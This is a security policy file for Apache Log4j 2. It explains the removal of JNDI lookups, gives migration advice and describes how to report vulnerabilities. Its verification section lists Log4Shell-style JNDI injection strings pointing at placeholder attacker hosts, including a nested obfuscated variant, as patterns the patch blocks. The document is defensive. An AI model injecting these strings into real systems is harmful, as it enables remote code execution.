# Security Policy

## Supported Versions

Only the most recent release of Apache Log4j 2 is supported.

## JNDI Vulnerability Mitigation

### Security Hardening - JNDI Lookup Removal

As a critical security hardening measure, **JNDI lookup functionality has been completely removed** from the log4j-core module to prevent remote code execution vulnerabilities. This change eliminates the ability for attackers to trigger malicious JNDI lookups through log message patterns.

### Technical Implementation

The following security measures have been implemented:

- **Complete JNDI Removal**: The `org.apache.logging.log4j.core.lookup.JndiLookup` class has been entirely removed from log4j-core
- **Interpolator Protection**: The lookup interpolator has been modified to skip JNDI registration and reject JNDI patterns
- **Pattern Blocking**: String substitution now actively blocks and rejects `${jndi:...}` patterns 
- **Fail-Safe Controls**: System property `log4j2.disable.jndi=true` provides additional administrative control
- **Defense in Depth**: Multiple layers of protection prevent JNDI resolution even in misconfigured environments

### Impact on Existing Configurations

**Important Notice for Users**: If your Log4j configuration previously used JNDI lookups (patterns like `${jndi:ldap://...}`, `${jndi:rmi://...}`, or similar), these will no longer function and will return empty values or be blocked entirely.

### Migration Guidance

For users who previously relied on JNDI lookups:

1. **Environment Variables**: Replace JNDI lookups with environment variable lookups using `${env:VARIABLE_NAME}`
2. **System Properties**: Use system property lookups with `${sys:property.name}`
3. **Map Lookups**: Consider using map-based lookups for dynamic configuration values
4. **Static Configuration**: Replace dynamic JNDI values with static configuration where appropriate

### Security Verification

This implementation blocks the following attack patterns:
- `${jndi:ldap://malicious.server/payload}`
- `${jndi:rmi://attacker.com/object}`
- `${jndi:dns://evil.domain/query}`
- Nested variations like `${${lower:jndi}:ldap://...}`

All such patterns will be safely rejected without performing any network operations or remote class loading.

## Reporting a Vulnerability

If you have encountered an unlisted security vulnerability or other unexpected behaviour that has security impact, please report them privately to the [Log4j Security Team](mailto:private@logging.apache.org).

## Past Vulnerabilities

See [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html).
